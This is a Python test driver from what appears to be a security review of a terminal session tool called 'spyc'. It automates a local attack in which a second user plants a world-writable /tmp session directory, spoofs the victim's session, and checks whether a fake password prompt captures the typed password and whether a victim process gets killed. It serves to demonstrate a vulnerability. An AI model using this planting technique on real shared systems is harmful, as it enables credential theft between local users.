#!/usr/bin/env python3
# P3-9 driver: runs as root in localhost/spyc-review-linux, one phase per
# container. Makes uid 1001 (mallory), has it plant /tmp/spyc-1000 first, then
# runs uid 1000's spyc at origin/main in a pty with neither XDG_RUNTIME_DIR
# nor TMPDIR set. PTY technique from Unit C's drive_v7.py.
import os, sys, pty, select, time, signal, fcntl, termios, struct, re, json, subprocess, shutil
PHASE = sys.argv[1]   # control | plant-tab | plant-notab | plant-attach
OUT = '/out/' + PHASE
SPYC = '/home/rev/target-p3/debug/spyc'
shutil.rmtree(OUT, ignore_errors=True); os.makedirs(OUT); os.chmod(OUT, 0o777)
LOG = open(os.path.join(OUT, 'events.log'), 'w', buffering=1)
RAW = open(os.path.join(OUT, 'raw.out'), 'wb', buffering=0)
T0 = time.monotonic()
def ev(*a): LOG.write('%8.3f %s\n' % (time.monotonic() - T0, ' '.join(str(x) for x in a)))
def sh(cmd, user=None):
    r = subprocess.run(cmd, shell=True, capture_output=True, text=True, user=user)
    return (r.stdout + r.stderr).strip()
ev('phase', PHASE, 'spyc', sh(SPYC + ' --version'))
ev('adduser', sh('adduser -D -u 1001 mallory 2>&1; id mallory'))
VUID = 1000
V = '/var/p3/victim'
for k in ['home', 'state', 'config', 'data', 'cache']: os.makedirs(os.path.join(V, k), exist_ok=True)
sh('chown -R 1000:1000 /var/p3/victim; chmod -R 700 /var/p3/victim')
env = {'PATH': '/usr/bin:/bin:/usr/sbin:/sbin', 'TERM': 'xterm-256color', 'LANG': 'C.UTF-8', 'SHELL': '/bin/sh',
       'HOME': V + '/home', 'XDG_STATE_HOME': V + '/state', 'XDG_CONFIG_HOME': V + '/config',
       'XDG_DATA_HOME': V + '/data', 'XDG_CACHE_HOME': V + '/cache',
       'SPYC_PANE_CMD': "sh -c 'echo READY_$$; exec cat'"}
ev('victim env (no XDG_RUNTIME_DIR, no TMPDIR)', json.dumps(env))
stand = None; decoy = None
if PHASE.startswith('plant'):
    ev('mallory mkdir', sh('umask 0; mkdir -m 777 /tmp/spyc-1000 && mkdir -m 777 /tmp/spyc-1000/sessions; ls -la /tmp/spyc-1000', user='mallory'))
if PHASE == 'plant-attach':
    # A token kept from an earlier session named VICTIM (session tokens are never removed, E7).
    tok = os.path.join(V, 'state', 'spyc', 'jar-tokens'); os.makedirs(tok, exist_ok=True)
    open(os.path.join(tok, 'VICTIM'), 'w').write('0123456789abcdef0123456789abcdef-REAL-SESSION-TOKEN')
    sh('chown -R 1000:1000 %s; chmod 700 %s; chmod 600 %s/VICTIM' % (os.path.join(V, 'state', 'spyc'), tok, tok))
    decoy = subprocess.Popen(['/bin/sleep', '300'], user=VUID, group=VUID)
    ev('decoy (a process of uid 1000)', decoy.pid)
    import threading; threading.Thread(target=decoy.wait, daemon=True).start()
    stand = subprocess.Popen(['python3', '-I', '/p3/stand_in.py', '/tmp/spyc-1000/sessions', str(decoy.pid), OUT + '/stand_in.log', 'VICTIM', 'PLANTED2'],
                             user='mallory', group='mallory', stdout=subprocess.DEVNULL, stderr=open(OUT + '/stand_in.stderr', 'w'))
    t = time.time()
    while not os.path.exists(OUT + '/stand_in.ready'):
        assert time.time() - t < 20, 'stand-in never ready'; time.sleep(0.1)
    ev('planted', sh('ls -la /tmp/spyc-1000 /tmp/spyc-1000/sessions'))
argv = [SPYC, 'attach'] if PHASE == 'plant-attach' else [SPYC]
pid, fd = pty.fork()
if pid == 0:
    os.setgroups([]); os.setgid(VUID); os.setuid(VUID)
    os.chdir(env['HOME'])
    os.execve(SPYC, argv, env)
fcntl.ioctl(fd, termios.TIOCSWINSZ, struct.pack('HHHH', 40, 120, 0, 0))
buf = b''
def pump(t):
    global buf
    end = time.monotonic() + t
    while True:
        left = end - time.monotonic()
        if left <= 0: return
        r, _, _ = select.select([fd], [], [], min(left, 0.05))
        if fd in r:
            try: d = os.read(fd, 65536)
            except OSError: ev('pty closed'); time.sleep(left); return
            if not d: return
            RAW.write(d); buf += d
            for q, a in [(b'\x1b[c', b'\x1b[?62c'), (b'\x1b[5n', b'\x1b[0n'), (b'\x1b[6n', b'\x1b[1;1R'), (b'\x1b[?u', b'\x1b[?0u')]:
                for _ in range(d.count(q)): os.write(fd, a)
def text(b): return re.sub(r'\x1b\[[0-9;?<>=]*[ -/]*[@-~]|\x1b[\]P^_].*?(\x07|\x1b\\)|\x1b[()][0-9A-Za-z]|\x1b[=>78DEHMc]', ' ', b.decode('utf-8', 'replace'))
def wait_for(pat, t, since=0):
    end = time.monotonic() + t
    while time.monotonic() < end:
        pump(0.1)
        if re.search(pat, buf[since:]): return True
    return False
def alive(p):
    try: os.waitpid(p, os.WNOHANG); os.kill(p, 0); return True
    except Exception: return False
def snap(tag, since=0):
    t = re.sub(r'\s+', ' ', text(buf[since:]))
    ev(tag, repr(t[-1500:]))
pump(5)
if PHASE == 'plant-attach':
    snap('attach printed')
    os.write(fd, b'VICTIM\r')
    ev('stand-in painted the terminal', wait_for(rb'password: ', 40))
    os.write(fd, b'hunter2\r'); pump(2)
    os.write(fd, b'\x1c'); pump(2)
    snap('attach after choosing VICTIM, typing, and ^\\')
    ev('decoy after attach: returncode', decoy.poll(), '(-15 = SIGTERM)')
    ev('stand-in log', open(OUT + '/stand_in.log').read())
else:
    snap('spyc started')
    if PHASE != 'plant-notab':
        os.write(fd, b'\x01'); pump(0.3); os.write(fd, b'c'); pump(1.0); os.write(fd, b'\r')
        ev('tab ready', wait_for(rb'READY_\d+', 30))
        pump(2)
        snap('after opening a tab')
        ev('processes', sh('ps -eo pid,ppid,user,stat,args'))
        ev('runtime dir', sh('ls -laR /tmp/spyc-1000 2>&1 | head -40'))
    mark = len(buf)
    if os.environ.get('P3_DETACH') == 'leader' and PHASE != 'plant-notab':
        os.write(fd, b'\x01'); pump(0.5); os.write(fd, b' '); pump(0.5); os.write(fd, b'd'); ev('sent ^a Space d (detach from the pane)')
    else:
        if PHASE != 'plant-notab':
            os.write(fd, b'\x01'); pump(0.5); os.write(fd, b'k'); pump(1.0); ev('sent ^a k (focus the list)')
        os.write(fd, b'\x04'); ev('sent ^d')
    pump(8)
    snap('after ^d', mark)
    ev('spyc still running', alive(pid))
    ev('processes after ^d', sh('ps -eo pid,ppid,user,stat,args'))
    ev('runtime dir after ^d', sh('ls -laR /tmp/spyc-1000 2>&1 | head -40'))
    ev('events log', sh('cat %s/state/spyc/*events* %s/state/spyc/*/events* 2>/dev/null | tail -20' % (V, V)))
ev('done')
